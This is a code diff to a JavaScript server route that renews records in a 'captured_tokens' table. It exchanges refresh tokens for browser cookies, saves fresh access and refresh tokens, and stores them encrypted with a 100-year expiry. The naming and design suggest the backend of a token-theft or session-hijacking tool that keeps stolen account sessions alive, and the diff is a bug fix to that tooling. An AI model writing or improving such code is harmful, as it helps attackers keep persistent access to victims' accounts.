@@ -370,8 +370,17 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType);
         
         if (result.success && result.cookies) {
-          // Update token in database with new cookies
+          // Update token in database with new cookies AND new tokens
           const ttlHours = 24 * 365 * 100; // 100 years
+          
+          // Use the NEW tokens from the exchange, not the old ones
+          const newAccessToken = result.access_token || accessToken;
+          const newRefreshToken = result.new_refresh_token || refreshToken;
+          
+          // Ensure they're different (access token and refresh token should never be the same)
+          const finalAccessToken = newAccessToken !== newRefreshToken ? newAccessToken : accessToken;
+          const finalRefreshToken = newRefreshToken;
+          
           await db.query(
             `UPDATE captured_tokens 
              SET cookies_encrypted = ?, token_type = 'cookie', expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), 
@@ -381,8 +390,8 @@ router.post('/:id/renew', userAuth, async (req, res) => {
             [
               encrypt(result.cookies),
               ttlHours,
-              result.new_refresh_token ? encrypt(result.new_refresh_token) : encrypt(accessToken),
-              encrypt(result.new_refresh_token || refreshToken),
+              encrypt(finalAccessToken),
+              encrypt(finalRefreshToken),
               token.id
             ]
           );
